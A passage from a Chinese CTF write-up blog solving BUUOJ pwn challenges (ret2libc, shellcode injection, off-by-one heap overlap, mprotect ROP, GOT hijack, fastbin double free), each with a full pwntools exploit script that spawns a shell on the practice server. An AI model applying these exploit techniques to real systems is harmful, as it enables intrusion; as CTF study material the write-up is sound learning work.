class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/07/Lm26WXhGQRPFAdC.png" alt="image.png"></p>
<h2 id="0x04B-cmcc-pwnme2-ret2libc"><a href="#0x04B-cmcc-pwnme2-ret2libc" class="headerlink" title="0x04B.cmcc_pwnme2 - ret2libc"></a>0x04B.cmcc_pwnme2 - ret2libc</h2><p>惯例的 <code>checksec</code> ，只开了 NX</p>
<p><img src="https://i.loli.net/2021/04/07/zFetDIXT972JlHw.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>直接就有gets()溢出</p>
<p><img src="https://i.loli.net/2021/04/07/61bcLnEpiZ5ChHq.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/04/07/5Pk39C6BqvlJNux.png" alt="image.png"></p>
<p>套板子 ret2libc 即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26415</span>)<span class="comment">#process(&#x27;./pwnme2&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwnme2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/32bit/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x6c</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]) * <span class="number">2</span> + p32(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/07/OtIHPzCk6ylZNSB.png" alt="image.png"></p>
<h2 id="0x04C-picoctf-2018-shellcode-shellcode"><a href="#0x04C-picoctf-2018-shellcode-shellcode" class="headerlink" title="0x04C.picoctf_2018_shellcode - shellcode"></a>0x04C.picoctf_2018_shellcode - shellcode</h2><p>拖入IDA进行分析</p>
<p>大概是会执行我们的输入</p>
<p><img src="https://i.loli.net/2021/04/07/8rZpNe32YAG49Vw.png" alt="image.png"></p>
<p>输一段shellcode即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27170</span>)<span class="comment">#</span></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/07/P1MynRDfKtHBchN.png" alt="image.png"></p>
<h2 id="0x04D-npuctf-2020-easyheap-off-by-one"><a href="#0x04D-npuctf-2020-easyheap-off-by-one" class="headerlink" title="0x04D.npuctf_2020_easyheap - off by one"></a>0x04D.npuctf_2020_easyheap - off by one</h2><p>惯例的 <code>checksec</code> ，保护全…只开了 NX 和 canary</p>
<p><img src="https://i.loli.net/2021/04/07/4wHohrKNgT5OlyI.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>大概是有着分配、编辑、打印、释放堆块的功能</p>
<p><img src="https://i.loli.net/2021/04/07/sSMY4UHKVZkPzvp.png" alt="image.png"></p>
<p> 限制了分配的 chunk 的大小为 0x18&#x2F;0x38</p>
<p><img src="https://i.loli.net/2021/04/07/lFBJthf9W8siZdc.png" alt="image.png"></p>
<p>使用如下结构体存储一个 chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_CHUNK_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">void</span> * chunk_ptr;</span><br><span class="line">&#125;chunk;</span><br></pre></td></tr></table></figure>

<p>漏洞点在于编辑时可以溢出 1 字节</p>
<p><img src="https://i.loli.net/2021/04/07/9pxBiuPVl3esbkw.png" alt="image.png"></p>
<p>原本想用 unlink 做的，后面发现出不来…那就只能走常规的 chunk overlapping 了</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26338</span>)<span class="comment">#process(&#x27;./npuctf_2020_easyheap&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./npuctf_2020_easyheap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of Heap(0x10 or 0x20 only) : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        new(<span class="number">0x18</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        edit(i, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">3</span> + p8(<span class="number">0xa1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">8</span> - i)</span><br><span class="line">    </span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        new(<span class="number">0x18</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x18</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    dump(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">    libc_base = main_arena - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    </span><br><span class="line">    new(<span class="number">0x38</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    edit(<span class="number">6</span>, p64(<span class="number">0xdeadbeef</span>) +  p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">1</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">6</span>, p64(<span class="number">0xdeadbeef</span>) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/07/LvNozJGHDm9hMn7.png" alt="image.png"></p>
<h2 id="0x04E-picoctf-2018-can-you-gets-me-ret2text-ret2shellcode"><a href="#0x04E-picoctf-2018-can-you-gets-me-ret2text-ret2shellcode" class="headerlink" title="0x04E.picoctf_2018_can_you_gets_me - ret2text + ret2shellcode"></a>0x04E.picoctf_2018_can_you_gets_me - ret2text + ret2shellcode</h2><p>惯例的<code>checksec</code>，只开了NX</p>
<p><img src="https://i.loli.net/2021/04/07/QHLKRI1Bghm7fV8.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>静态编译，gets()溢出</p>
<p><img src="https://i.loli.net/2021/04/07/SNuvxtamnPgpwLA.png" alt="image.png"></p>
<p>套板子mprotect + shellcode，exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29207</span>)<span class="comment">#process(&#x27;./PicoCTF_2018_can-you-gets-me&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_can-you-gets-me&#x27;</span>)</span><br><span class="line">sc_addr = (e.bss() + <span class="number">0x1000</span>) &amp; <span class="number">0xfffff000</span></span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = e.search(asm(<span class="string">&#x27;pop ebx ; pop esi ; pop edi ; pop ebp ; ret&#x27;</span>)).__next__()</span><br><span class="line">mprotect_addr = e.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/07/crKuiFajY9N2RkQ.png" alt="image.png"></p>
<h2 id="0x04F-picoctf-2018-got-shell-got-hijack"><a href="#0x04F-picoctf-2018-got-shell-got-hijack" class="headerlink" title="0x04F.picoctf_2018_got_shell - got hijack"></a>0x04F.picoctf_2018_got_shell - got hijack</h2><p>惯例的<code>checksec</code>，只开了NX</p>
<p><img src="https://i.loli.net/2021/04/07/Oovbe7JY8xfSspc.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>任意地址写4字节</p>
<p><img src="https://i.loli.net/2021/04/07/3eAbC4TZRVpSXg2.png" alt="image.png"></p>
<p>有后门函数</p>
<p><img src="https://i.loli.net/2021/04/07/DasloJIrKb4TnXd.png" alt="image.png"></p>
<p>exi的got改为后门函数地址即可，exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25413</span>)<span class="comment">#process(&#x27;./PicoCTF_2018_got-shell&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./PicoCTF_2018_got-shell&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(e.got[<span class="string">&#x27;exit&#x27;</span>]))</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(e.sym[<span class="string">&#x27;win&#x27;</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/07/ZgCYStkDpJNlMXj.png" alt="image.png"></p>
<h2 id="0x050-gyctf-2020-some-thing-exceting-Use-After-Free-Fastbin-double-free"><a href="#0x050-gyctf-2020-some-thing-exceting-Use-After-Free-Fastbin-double-free" class="headerlink" title="0x050.gyctf_2020_some_thing_exceting - Use After Free + Fastbin double free"></a>0x050.gyctf_2020_some_thing_exceting - Use After Free + Fastbin double free</h2><p>惯例的 <code>checksec</code> ，除了PIE以外的保护全开</p>
<p><img src="https://i.loli.net/2021/04/07/4Y6NnkQUM8A5usa.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>大概是有着分配、打印、释放堆块的功能，编辑功能不可用</p>
<p><img src="https://i.loli.net/2021/04/07/aBDoznpRVg1vb7F.png" alt="image.png"></p>
<p>初始化时会将flag读入到bss段上，且将bss段上某个字节设为 0x60 （暗示（<del>明示</del>）在 bss 上构造 fake chunk）</p>
<p><img src="https://i.loli.net/2021/04/07/pYJlGNnMDrxKbAP.png" alt="image.png"></p>
<p>一次会分配三个chunk，一个小chunk用来装用户的两个chunk，限制了大小不能大于0x70</p>
<p><img src="https://i.loli.net/2021/04/07/aYF4JCku6nxGdrW.png" alt="image.png"></p>
<p>存在UAF</p>
<p><img src="https://i.loli.net/2021/04/07/RAnJHscQtuhoymB.png" alt="image.png"></p>
<p>那就通过fastbin double free获取一个位于bss段上的chunk后打印就有flag了</p>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28556</span>)<span class="comment">#process(&#x27;./gyctf_2020_some_thing_exceting&#x27;)#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; Now please tell me what you want to do :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size1:<span class="built_in">int</span>, content1, size2:<span class="built_in">int</span>, content2</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; ba&#x27;s length : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size1).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; ba : &quot;</span>)</span><br><span class="line">    p.send(content1)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; na&#x27;s length : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size2).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; na : &quot;</span>)</span><br><span class="line">    p.send(content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; Banana ID : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; SCP project ID : &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x50</span>, p64(<span class="number">0x6020a0</span> - <span class="number">0x8</span>), <span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x50</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="number">0x50</span>, <span class="string">b&#x27;f&#x27;</span>)</span><br><span class="line">    dump(<span class="number">4</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可获得flag</p>
<p><img src="https://i.loli.net/2021/04/07/oC5E8IGLjtzpycM.png" alt="image.png"></p>
<h1 id="0x051-0x060"><a href="#0x051-0x060" class="headerlink" title="0x051 ~ 0x060"></a>0x051 ~ 0x060</h1><h2 id="0x051-axb-2019-brop64-ret2libc-BROP"><a href="#0x051-axb-2019-brop64-ret2libc-BROP" class="headerlink" title="0x051.axb_2019_brop64 - ret2libc | BROP"></a>0x051.axb_2019_brop64 - ret2libc | BROP</h2><p>原题是Blind pwn，不过buu上给了二进制文件，那这道题就用两种方法来做做</p>
<h3 id="解法一：ret2libc-1"><a href="#解法一：ret2libc-1" class="headerlink" title="解法一：ret2libc"></a>解法一：ret2libc</h3><p>惯例的<code>checksec</code>，只开了NX</p>
<p><img src="https://i.loli.net/2021/04/07/elBZODv7jsPJgf2.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>有溢出，有输出，套板子ret2libc</p>
<p><img src="https://i.loli.net/2021/04/07/lVjKkxifayvrXMp.png" alt="image.png"></p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27522</span>)<span class="comment">#process(&#x27;./axb_2019_brop64&#x27;)#</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./axb_2019_brop64&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# </span></span><br><span class="line">offset = <span class="number">0xd0</span></span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">pop_rsi_pop_r15_ret = e.search(asm(<span class="string">&#x27;pop rsi ; pop r15 ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(e.got[<span class="string">&#x27;read&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.sym[<span class="string">&#x27;main&#x27;</span>]))</span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/04/07/joiKH6vU5wXtBZq.png" alt="image.png"></p>
<h3 id="解法二：BROP-1"><a href="#解法二：BROP-1" class="headerlink" title="解法二：BROP"></a>解法二：BROP</h3><blockquote>
<p>先🕊</p>
</blockquote>
<h2 id="0x052-axb-2019-fmt64-fmtstr-got-hijack"><a href="#0x052-axb-2019-fmt64-fmtstr-got-hijack" class="headerlink" title="0x052.axb_2019_fmt64 - fmtstr + got hijack"></a>0x052.axb_2019_fmt64 - fmtstr + got hijack</h2><p>惯例的<code>checksec</code>，只开了NX</p>
<p><img src="https://i.loli.net/2021/04/07/aiLvs1OIQcMG2BV.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p>不限制次数的格式化字符串漏洞</p>
<p><img src="https://i.loli.net/2021/04/07/ysBY9SrjL6ap7eI.png" alt="image.png"></p>
<p>简单测试一下，格式化字符串大概是位于栈上的第 8 个参数</p>
<p><img src="https://i.loli.net/2021/04/07/iCqZYVsRQDEzg8m.png" alt="image.png"></p>
<p>大概思路是利用got表泄露 libc 基址，改 printf 的 got 表为 system 即可</p>
<p>构造 exp 如下：</p>
